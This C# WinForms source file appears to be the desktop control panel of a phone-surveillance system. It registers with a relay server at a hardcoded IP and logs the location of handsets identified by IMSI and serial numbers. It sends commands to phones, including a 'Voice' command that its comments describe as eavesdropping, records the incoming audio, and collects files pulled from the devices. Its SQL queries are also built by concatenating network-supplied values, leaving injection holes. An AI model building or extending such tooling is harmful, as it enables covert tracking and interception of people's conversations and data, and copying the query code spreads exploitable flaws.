using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using TalkComLib;
using AndroidTalkComLib;
using System.Runtime.InteropServices;
using System.Data.OleDb;
using System.Diagnostics;
using System.Collections;

namespace sever2
{
    public partial class Phone : Form
    {
        public Phone()
        {
            
            initServerIP();
            initIPEndPoint();

            InitializeComponent();

            //将tabPage1（终端管理选项卡）隐藏
            this.tabPage1.Parent = null;
        }


        public static string getP2PIPAddress()
        {
            return SERVERIP;
            /*
            bool[] bad = new bool[15];
            for (int i = 0; i < 15; ++i) {
                bad[i] = false;
            }
            for (int i = 0; i < 15; ++i) {
                if (P2P_OLD[i] == '0') {
                    if (i == 0) bad[i] = true;
                    if (i == 1 && P2P_OLD[i - 1] == '0') bad[i] = true;
                    if (i >= 2 && P2P_OLD[i - 1] == '.') bad[i] = true;
                    if (i >= 2 && P2P_OLD[i - 1] == '0' && P2P_OLD[i - 2] == '.') bad[i] = true;
                }
            }
            string ret = "";
            for (int i = 0; i < 15; ++i) {
                if (!bad[i]) ret = ret.Insert(ret.Length, P2P_OLD.Substring(i, 1));
            }
            
            //MessageBoxTimeOut showIP = new MessageBoxTimeOut();
            //showIP.Show(ret, "new IP", 3000);
            return ret;
             */
            
        }

        private String initServerIP()
        {
            //SERVERIP
            String address = "";
            StreamReader fileStream = null;
            try
            {
                fileStream = new StreamReader(configFile, System.Text.Encoding.Default);
              
                address += fileStream.ReadLine();
                
                fileStream.Close();
                fileStream.Dispose();
            }
            catch
            {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("加载IP失败");
            }

            SERVERIP = address;

            initIPEndPoint(); //重置连接地址：
            return address;

        }
        private void Phone_Load(object sender, EventArgs e)
            
        {
            initServerIP();
            initIPEndPoint();

            toolStripStatusLabel1.Text = "准备监听";
            lis = true;
            
           GetTree(); //加载客户端信息             
           login();   //第三方与控制端连接线     
           
           //yuyinM();   //开启mobile语音接收
           yuyinS();  //开启Symbian语音接收   

           
           loadingPage(); //加载地图页面
           loadingPlace(displayLoc); //加载位置信息
        }

        #region 全局变量   
 
       
        FileStream MyFileStream;     
        TcpListener lisner1;
        bool lis;
        //static string P2P_OLD = "202.004.155.187";  //第三方IP地址
        //static string P2P_OLD = "202.004.155.187";
        String configFile = AppDomain.CurrentDomain.BaseDirectory + "ServerIP.config";
        static string SERVERIP = "202.4.155.37";
        //static string P2P_OLD = "119.118.095.229";    //沈阳第三方IP地址

        static string cord = "";  //上一次选择的经纬度

        static int displayLoc = 18;

        Interface iface;
        AndroidVoiceInterface Aface;



        static bool clientTree = true;
        static bool locTree = true;

        IPEndPoint TranTo = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), 4000);
        static IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
        static IPEndPoint severM = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));

        private void initIPEndPoint()
        {
            TranTo = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), 4000);
            sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
            severM = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));
        }



        Socket Log ; //控制端与第三方连接线
        Socket SocketS = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//文件连接线 
        string FileNow;           //记录当前语音写入的文件名
        IPEndPoint symTemp = new IPEndPoint(IPAddress.Any, 2007);
        IPEndPoint mobTemp = new IPEndPoint(IPAddress.Any, 10001);
       

        //public static DateTime now = DateTime.Now;
        #endregion


        #region  加载客户端信息

        public void GetTree()
        {

            treeView2.Nodes.Clear();
            string PhoneNum, PhoneID, Flag, Time,OS;

            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            string sqlU = "update Client set Flag ='" + "Off" + "' where Flag = '" + "On" + "'";
            OleDbCommand myCmd = new OleDbCommand(sqlU, conn);
            myCmd.ExecuteNonQuery();
            string sql = "select * from Client ";
            myCmd = new OleDbCommand(sql, conn);

            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                PhoneNum = datareader["PhoneNum"].ToString();         //IMSI号
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID+" "+OS;
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
            }
            conn.Close();
        }

        public void GetTreeTest()
        {
            treeView2.Nodes.Clear();
            string PhoneNum, PhoneID, Flag, Time,OS;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client Order by SendTime DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            int num=0;

            while (datareader.Read())
            {       
                PhoneNum = datareader["PhoneNum"].ToString();
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID + " " + OS;                
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                /*
                string sqlT = "update Client set Flag ='" + "Off" + "' where  SendTime = '" + Time + "'";
                
                if (Flag.CompareTo("On") == 0)
                {
                    //检查是否过期 超过两分钟 则设为Off
                    System.DateTime date3 = Convert.ToDateTime(Time);
                    System.DateTime ComTime = System.DateTime.Now;
                    System.TimeSpan diff2 = ComTime - date3;

                    if (diff2.TotalMinutes > 2)
                    {
                        OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                        myCmd1.ExecuteNonQuery();
                        //MessageBox.Show(OS +"@" + PhoneID + "@客户端掉线");
                        treeView2.Nodes.Add(PhoneNum, PhoneNum,18);                        
                        //treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                    }
                    else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                        if (PhoneNum.CompareTo(SelectBefore) == 0) //为刷新前选中的客户端
                            treeView2.SelectedNode =treeView2.Nodes[num-1];
                    }
                }
                else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                    }

                */
                treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                num++;

            }

            conn.Close();
        }

        public void ClientOffline()
        {
            
            string PhoneNum, PhoneID, Flag, Time, OS;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client Order by SendTime DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            int num = 0;

            while (datareader.Read()) {
                PhoneNum = datareader["PhoneNum"].ToString();
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID + " " + OS;
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                string sqlT = "update Client set Flag ='" + "Off" + "' where  SendTime = '" + Time + "'";
                if (Flag.CompareTo("On") == 0) {
                    OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                    myCmd1.ExecuteNonQuery();
                    //treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
                    num++;
               } 
                else {
                    //treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
                    num++;
                }
            }

            conn.Close();
        }
        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
           // treeView1.SelectedImageIndex = treeView2.SelectedNode.ImageIndex;
        }

        #endregion

        #region  上线注册

        public void connectServer(object source, System.Timers.ElapsedEventArgs e)
        {
            try {
                Byte[] send = Encoding.ASCII.GetBytes("Moniter");
                if (Log == null) return;
                TransferFiles.SendVarData(Log, send);        //向第三方进行上线注册  
            } catch {

            }
        } 
               //TCP注册
        private void loginT()
        {
            //线程测试是否掉线
            //注册后每隔10s再注册一次
            System.Timers.Timer t = new System.Timers.Timer(3000);  //实例化Timer类，设置间隔时间为10000毫秒；   
            t.Elapsed += new System.Timers.ElapsedEventHandler(connectServer);  //到达时间的时候执行事件；   
            t.AutoReset = true;  //一直执行(true)；   
            t.Enabled = true; //是否执行System.Timers.Timer.Elapsed事件；   

            while (true)
            {
                try
                {
                    //20120221关闭上次Log,并重新建立连接
                    if (Log != null) Log.Close();
                    Log = null;

                    //掉线后让所有客户端下线
                    //GetTree();

                    Log= new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    Log.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 60 * 1000);
                    IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("6000"));                  
                    Byte[] send = Encoding.ASCII.GetBytes("Moniter");

                    //重新连接前让所有手机端下线
                    

                    //int countCon = 0; //尝试连接次数
                    while (true)
                    {
                        
                        try
                        {
                            //20120221这个地方有问题
                            //if (Log.Connected)
                            //{
                            //   break;
                            //}
                            //else
                            {
                                Thread.Sleep(1000);  //等待１S再重连
                                toolStripStatusLabel4.Text = getP2PIPAddress() + ": 网络异常或服务器未启动";
                                Log.Connect(sever);
                                break;
                            }
                        }
                        catch
                        {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ": 网络异常或服务器未启动";
                        }
                    }
                    TransferFiles.SendVarData(Log, send);        //向第三方进行上线注册  

                    while (true)   //接收服务器端的信息
                    {
                        //<>
                        byte[] tempKZ = TransferFiles.ReceiveVarData(Log);
                        string sTemp1 = Encoding.ASCII.GetString(tempKZ);
                        if (tempKZ.Length == 0) {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ":网络异常或服务器未启动..";
                            ClientOffline();
                            //MessageBox.Show("网络异常或服务器未启动")
                            break;
                        } 
                        else {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ":登录服务器成功";
                        }

                        if (sTemp1.IndexOf("FileName") != -1)  //当收到的是文件名时
                        {
                           //MessageBox.Show("收到文件名:" + sTemp1);
                           // FileDown(sTemp1);   
                            string[] pinfor = sTemp1.Split('@');
                            string filename = pinfor[1] + "@" + pinfor[2] + "@" + pinfor[3] + "@" + pinfor[4];
                            //将此手机添加到客户列表
                            //PhoneZC@
                            /*string SHOW = "";
                            for (int i = 0; i < pinfor.Length; ++i) {
                                SHOW += pinfor[i];
                                SHOW += "\n";
                            }
                            MessageBox.Show(SHOW);
                            */

                            string OS = "Android";
                            //string PhoneNum = pinfor[1];  //IMSI号
                            //string PhoneID = pinfor[2];   //序列号
                            string PhoneNum = pinfor[2];  //序列号
                            string PhoneID = pinfor[1];   //IMSI号
                            ClientOnline(PhoneNum, PhoneID, OS);  

                            StartReceive(filename);
                        }

                        if (sTemp1.IndexOf("Location") != -1) { //当收到的位置信息时
                            string[] pinfor = sTemp1.Split('@');

                            //MessageBox.Show(sTemp1);

                            if (pinfor.Length == 6) {
                                string OS = pinfor[1];
                                string PhoneNum = pinfor[2];  //IMSI号
                                string PhoneID = pinfor[3];   //序列号
                                string Longitude = pinfor[4];
                                string Latitude = pinfor[5];
                                bool ok = true;
                                if (PhoneID.Length != 15) ok = false;
                                if (PhoneNum.Length != 15) ok = false;

                                //将此手机添加到客户列表
                                //PhoneZC@
                                ClientOnline(PhoneID, PhoneNum, OS); 

                                try {
                                    double longti = System.Convert.ToDouble(Longitude);
                                    double lati = System.Convert.ToDouble(Latitude);
                                } catch {
                                    ok = false;
                                }
                                if (ok) {
                                    InsertIntoTable(OS, PhoneNum, PhoneID, Longitude, Latitude);
                                    locTree = true;
                                }
                            }
                        }
                        /*   //注释掉手机注册模块
                        if (sTemp1.IndexOf("PhoneZC") !=-1) //当收到的是手机注册信息时
                        {
                            string[] pinfor = sTemp1.Split('@');
                            if (pinfor.Length == 4) {
                                string OS = pinfor[1];
                                string PhoneNum = pinfor[2];  //IMSI号
                                string PhoneID = pinfor[3];   //序列号
                                bool ok = true;
                                if (PhoneID.Length != 15) ok = false;
                                if (PhoneNum.Length != 15) ok = false;
                                if (ok) {
                                    ClientOnline(PhoneNum, PhoneID, OS);      //更新客户端列表  
                                    Command(PhoneNum, PhoneID, OS);
                                }
                            }

                        }*/
                        if (sTemp1.IndexOf("AndAReg") != -1) { //android语音接收掉线
                            //启动android接收语音进程
                            string[] pinfor = sTemp1.Split('@');
                            //andareg@IMEI@IMSI
                            string PhoneNum = pinfor[1];
                            string PhoneID = pinfor[2];

                            //将此手机添加到客户列表
                            ClientOnline(PhoneID, PhoneNum, "Android"); 

                            //在Debug\ReceviceFile\Voice中建立一个以当前日期命名的文件夹
                            // string RTime = System.DateTime.Now.ToShortDateString();
                            string RTime = System.DateTime.Now.ToString("yyyy-MM-dd");
                            string fileSub = "Voice\\" + RTime;
                            string path = FileCreateSub(fileSub);

                            //文件命名 时间获取   文件格式 34567890@1342222222@2011-2-16 20;59;08.amr
                            //string TimeFull = System.DateTime.Now.ToString();
                            string TimeFull = System.DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss");
                            string Name = TimeFull.Replace(':', ';');

                            //string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                            string RecordFileName = Name + ".wav";
                            string fileFullName = path + "\\" + RecordFileName;
                            FileNow = fileFullName;


                            Aface = new AndroidVoiceInterface();
                            //MessageBox.Show("Android test...初始化成功");
                            Aface.Ini(FileNow, getP2PIPAddress());
                        }


                    }
                }
                catch
                {
                    toolStripStatusLabel4.Text = getP2PIPAddress() + ":网络异常或服务器未启动...";
                    ClientOffline();
                    if (Log != null)
                        Log.Close();
                    Log = null;
                }
            }
        }

        void InsertIntoTable(string OS, string PhoneNum, string PhoneID, string Longitude, string Latitude)
        {
            try {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                DataTable dt = new DataTable();
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                String Time = DateTime.Now.ToString();

                string sqlI = "insert into Location ( PhoneNum, PhoneID, Latitude, Longitude,  OS, ArriveTime) values ('" +
                    PhoneNum + "','" + PhoneID + "','" + Latitude + "','" + Longitude + "','" + OS + "','" + Time + "')";
                OleDbCommand myCmd = new OleDbCommand(sqlI, conn);
                //MessageBox.Show(sqlI); //it's a comment
                int AFFECTED = myCmd.ExecuteNonQuery();
                //MessageBox.Show("" + AFFECTED);
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException e) {
                //MessageBox.Show(e.ToString().Substring(300));
            }
            catch (System.InvalidOperationException e) {
                //MessageBox.Show(e.ToString());
            }

        }
        void Command(string PhoneNum ,string PhoneID,string OS)
        {
            //并将命令发送到第三方 利用已经建立好的第三方和控制端连接线 命令发送形式 Order@PhoneNum@PhoneID@Content             
           
            string[] a = new string[] { };

            a = GetCommand(PhoneID, PhoneNum, OS);              //每接收到手机注册就获取是否有此手机的命令

            if (a != null)                        //有此手机的命令时
            {
                i = 0;
                while (a[i] != null)
                {
                    if (a[i].CompareTo("Voice") != 0)
                    {
                        try
                        {
                            string Content = a[i];
                            string command = "Order" + "@" + PhoneNum + "@" + PhoneID + "@" + Content;
                            byte[] msg = Encoding.UTF8.GetBytes(command);
                            MessageBoxTimeOut temp1 = new MessageBoxTimeOut();
                           temp1.Show("向手机端" + PhoneID + "发送命令" + a[i], "命令发送提示", 3000);
                           

                            TransferFiles.SendVarData(Log, msg);

                            //等2s后再发送下一个命令
                            //Thread.Sleep(2000);

                            if (a[i].CompareTo("Stop") == 0 && (OS.CompareTo("Mobile") == 0 || OS.CompareTo("IPhone") == 0))
                            {
                                if (iface != null)
                                    iface.BeClose();
                                //StopyuyinM();

                            }
                            if (a[i].CompareTo("Stop") == 0 && OS.CompareTo("Symbian") == 0)
                            {                               
                                //StopyuyinS();
                            }
                            i++;
                        }
                        catch //(Exception E)
                        {
                           // MessageBox.Show(E.ToString());
                        }
                    }
                    else                                                          //当命令是语音命令时
                    {
                        string Content = a[i];
                        string command = "Order" + "@" + PhoneNum + "@" + PhoneID + "@" + Content;
                        byte[] msg = Encoding.UTF8.GetBytes(command);
                                          
                        MessageBoxTimeOut temp1 = new MessageBoxTimeOut();
                        temp1.Show("向手机端" + PhoneID + "发送命令" + a[i], "命令发送提示", 3000);
                       
                        TransferFiles.SendVarData(Log, msg);

                        //语音不同系统进行处理
                        FileVoiceCreate(PhoneID, PhoneNum, OS);
                        //每发送一个语音监听就在Debug\ReceviceFile\Voice中建立一个以当前日期命名的文件夹及其中的接收文件 命名格式 手机号@序列号@时间
                        if (OS.CompareTo("Symbian") == 0)                          //Symbian语音处理
                        {
                            if (File.Exists(MyFileName))
                                File.Delete(MyFileName);
                            if (File.Exists(MyFileName2))
                                File.Delete(MyFileName2);
                            if (File.Exists(MyFileName11))
                                File.Delete(MyFileName11);
                            if (File.Exists(MyFileName21))
                                File.Delete(MyFileName21);
                           //yuyinS();
                        }
                        if (OS.CompareTo("Mobile") == 0 || OS.CompareTo("IPhone") == 0)
                        {
                            iface = new Interface();                           //Windows Mobile的语音处理  
                            iface.Ini(FileNow, getP2PIPAddress());
                            
                          //  yuyinM();
                          //  MessageBox.Show(FileNow);

                            try
                            {
                          //      Ini(FileNow);
                            }
                            catch (Exception e)
                            {
                           //     MessageBox.Show("ini" + e.ToString());
                            }
                        }
                        if (OS.CompareTo("Android") == 0)                              //Android语音处理
                        {
                           
                            try
                            {
                                Aface = new AndroidVoiceInterface();
                                //MessageBox.Show("Android test...初始化成功");
                                Aface.Ini(FileNow, getP2PIPAddress());
                            }
                            catch (Exception e)
                            {
                                   MessageBox.Show("Android测试用-ini" + e.ToString());
                            }
                        }
                        toolStripStatusLabel1.Text = System.DateTime.Now.ToString();
                        i++;
                    }
                }
            }
        }
        #endregion

        #region 多个线程接收手机注册函数     12.15号改

        //命令多线程
        public void Order()
        {

            IPEndPoint TranFrom = new IPEndPoint(IPAddress.Any, 4000);//监听4000端口              

            lisner1 = new TcpListener(TranFrom);
            lisner1.Start();

            while (true)
            {
                try
                {
                    while (lis)
                    {
                        if (!lisner1.Pending())
                        {
                            Thread.Sleep(1000);
                            continue;
                        }

                        //  if (SocketS != null) SocketS.Close();
                        //接受服务器传来手机注册信息的Socket
                        SocketS = lisner1.AcceptSocket();
                        SocketS.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        //每接收一个连接创建一个新的线程进行接收，主线程继续监听
                        ParameterizedThreadStart pts = new ParameterizedThreadStart(OrderSub);
                        Thread ThreadReceive = new Thread(pts);
                        ThreadReceive.IsBackground = true;
                        ThreadReceive.Start(SocketS);
                    }

                }
                catch
                {
                  
                }
            }
        }

        public void OrderSub(object obj)
        {
            Socket SocketS = (Socket)obj;
            try
            {
                //接收手机端传来的手机连接（命令）
                while (true)
                {
                    byte[] temp = TransferFiles.ReceiveVarData(SocketS);
                    string temp2 = System.Text.Encoding.ASCII.GetString(temp);
                   
                    if (temp.Length == 0)                      
                        break;
                    else
                    {
                        string[] pinfor = temp2.Split('@');   //更改1031                      
                        string OS = pinfor[0];
                        string PhoneNum = pinfor[1];  //IMSI号
                        string PhoneID = pinfor[2];   //序列号
                        bool ok = true;
                        if (PhoneNum.Length != 15) ok = false;
                        if (PhoneID.Length != 15) ok = false;
                        if (ok) {
                            ClientOnline(PhoneNum, PhoneID, OS);
                        }
                       
                             //在界面中显示手机上线状态
                        
                    }
                }

            }
            catch
            {             

            }
            finally
            {
                SocketS.Close();
            }
        }
        #endregion

        #region 功能函数 开始接受文件
        //多个线程接收文件
        private void StartReceive(string filename)
        {
         
              Byte[] send = Encoding.ASCII.GetBytes("FileAsk"+"@"+filename);
             try
                {
                    Socket client= new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("7000"));                  
                 
                    while (true)
                    {
                        try
                        {
                            if (client.Connected)
                            {                               
                                break;
                            }
                            else
                            {
                                client.Connect(sever);
                            }
                        }
                        catch
                        {
                            
                        }
                    }
                    TransferFiles.SendVarData(client, send);        //向第三方发送下载文件名
                   
                   //接收第三方传来的文件
                    FileSub(client);                    
                
                }
                 catch
                  {
                 
                  }
            }

        public void FileSub(Socket client)
        {
            //获得[文件名]   
            string SendFileName = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
          
  
            //获得[包的大小]   
            string bagSize = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
            //MessageBox.Show("包大小" + bagSize);   
  
            //获得[包的总数量]   
            int bagCount = int.Parse(System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client)));   
            //MessageBox.Show("包的总数量" + bagCount);   
  
            //获得[最后一个包的大小]   
            string bagLast = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
            //MessageBox.Show("最后一个包的大小" + bagLast);   
          
            string[] pinfor = SendFileName.Split('@');   //更改1031                
           
            string PhoneID = pinfor[0];
            string PhoneNum = pinfor[1];
            string ShortName = pinfor[3];
            MessageBoxTimeOut FileShow = new MessageBoxTimeOut();
            
            //创建一个新文件
            string path = FileCreateSub(PhoneID);
            string RTime = "";
            if (!ShortName.ToLower().EndsWith(".zip")) {
                //如果不是zip文件，则精确到毫秒
                RTime = System.DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss-ffff");
            } else {
                //如果是zip文件，精确到天
                RTime = System.DateTime.Now.ToString("yyyy_MM_dd");
            }
            
            SendFileName = PhoneNum + "@" + RTime +"@"+ ShortName;

            string fileFullName = path + "\\" + SendFileName;

             //创建一个新文件   
            MyFileStream = new FileStream(fileFullName, FileMode.Create, FileAccess.Write);     

            //已发送包的个数
            int SendedCount = 0;
            byte[] data;
            int TotalSize = 0;
            while (true)
            {
                data = TransferFiles.ReceiveVarData(client);
                if (data.Length == 0)
                {
                    break;
                }
                else
                {
                    TotalSize += data.Length;
                    SendedCount++;
                    //将接收到的数据包写入到文件流对象
                    MyFileStream.Write(data, 0, data.Length);
                    MyFileStream.Flush();
                    MyFileStream.Close();
                    break;
                }
            }
            float temp2 = 0;
            string t;

            float temp1 = TotalSize / 1024;


            if (temp1 > 1024)
            {
                temp2 = temp1 / 1024;

                t = temp2.ToString() + "MB";

            }
            else if (temp1 < 1)
            {
                t = "1KB";
            }
            else t = temp1.ToString() + "KB";

            //关闭文件流
            if (MyFileStream != null)
                MyFileStream.Close();
            client.Close();


            if (!ShortName.ToLower().EndsWith(".zip")) {
                FileShow.Show(ShortName, "收到文件提示", 3000);
            }
            //将标志位置为Finished=1
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string now = System.DateTime.Now.ToString();
            string finished = "update Client set Finished ='" + "1" + "'where  PhoneID = '" + PhoneID + "'and PhoneNum='" + PhoneNum + "'";
            OleDbCommand fish_Cmd = new OleDbCommand(finished, conn);
            fish_Cmd.ExecuteNonQuery();
            conn.Close();


            //填加到dgv里
            // 手机号，文件名，文件大小，完成时间 
            //如果是zip文件片断的第一个包则放在dgv里，其余zip文件片断不处理
            
            if (SendFileName.ToLower().EndsWith(".zip")) {
                String[] real = ShortName.Split('-');
                int all = int.Parse(real[0]);
                //当收到最后一个zip文件片断时，将其放入dgv中
                if(int.Parse(real[1]) == int.Parse(real[0])) {
                    //等待一分钟，尝试查看是否所有文件片断都接收成功,共尝试五次
                    int tryTime = 0;
                    bool already = false;
                    while (tryTime < 5) {
                        already = true;
                        //查找目录下的xx-xx-xx.zip是否都存在
                        
                        
                        for (int i = 1; i <= all; ++i) {
                            String prefix = PhoneNum + "@" + RTime + "@" + String.Format("{0:d}-{1:d}-{2}-mmc.zip", all, i, real[2]);
                            String filePath = path + "\\" + prefix;
                            
                            if (!System.IO.File.Exists(filePath)) {
                                already = false;
                            }
                            if (!already) break;
                        }
                       
                        if (already) break;
                        //如果有文件没传过来，尝试暂停30s再试
                        System.Threading.Thread.Sleep(30000);
                        ++tryTime;

                    }
                    //有文件片断传送失败
                    if (!already) return;
                    //将所有文件写入到一个文件中
                    String prefixTmp = PhoneNum + "@" + RTime + "@" + String.Format("{0}-mmc.zip", real[2]);
                    String finalName = path + "\\" + prefixTmp;
                    FileStream stream = new FileStream(finalName, FileMode.Create, FileAccess.Write);
                    for (int i = 1; i <= all; ++i) {
                        String prefix = PhoneNum + "@" + RTime + "@" + String.Format("{0:d}-{1:d}-{2}-mmc.zip", all, i, real[2]);
                        String filePath = path + "\\" + prefix;
                        //读取每一个文件，将其写入stream中
                        //FileShow.Show(filePath, "File", 5000);
                        FileStream streamTmp = new FileStream(filePath, FileMode.Open);
                        BinaryReader br = new BinaryReader(streamTmp);
                        try {
                            byte[] content = br.ReadBytes((int)streamTmp.Length);
                            stream.Write(content, 0, content.Length);
                            stream.Flush();
                        } catch(Exception e) {

                        }
                        br.Close();
                        if (File.Exists(filePath)) {
                            File.Delete(filePath);
                        }
                        streamTmp.Close();

                    }
                    stream.Close();
                    string DoneTime = System.DateTime.Now.ToString();
                    AddRow(PhoneNum, PhoneID, prefixTmp, t, DoneTime, finalName);
                    FileShow.Show(prefixTmp, "File", 3000);
                }
               
            } else {
                string DoneTime = System.DateTime.Now.ToString();
                AddRow(PhoneNum, PhoneID, SendFileName, t, DoneTime, fileFullName); 
            }
           
            
    }
       
        #endregion
        #region 向显示表格添加项的函数
        private delegate void DelAddRow(object o1, object o2, object o3, object o4, object o5, object o6);

        private void AddRow(object o1, object o2, object o3, object o4, object o5, object o6)
        {
            if (InvokeRequired)
            {
                DelAddRow dar = new DelAddRow(AddRow);
                this.Invoke(dar, o1, o2, o3, o4, o5, o6);
                return;
            }
            this.dataGridView1.Rows.Add(o1, o2, o3, o4, o5, o6);
        }

        #endregion     
      

        private void timer1_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = DateTime.Now.ToString();
        }
       

        private void dataGridView1_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {

            string filename = dataGridView1.SelectedCells[5].Value.ToString();
            
            //先查看filename的类型
            ////20111117
            if(filename.ToLower().EndsWith(".zip"))
            {
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.FileName = "ShowColorMsg.exe";//需要启动的程序名       
                p.StartInfo.Arguments = filename;//启动参数       
                p.Start();//启动
               
            } else {
                System.Diagnostics.Process.Start(filename);
            }
            
            
        }

        #region 数据库的操作

        //   
        //新增客户端，将数据插入client表中      
        private void IntoDatabase1(string t1, string t2, string t3, string t4, string t5, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
        private void IntoDatabase(string t1, string t2, string t3, string t4, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
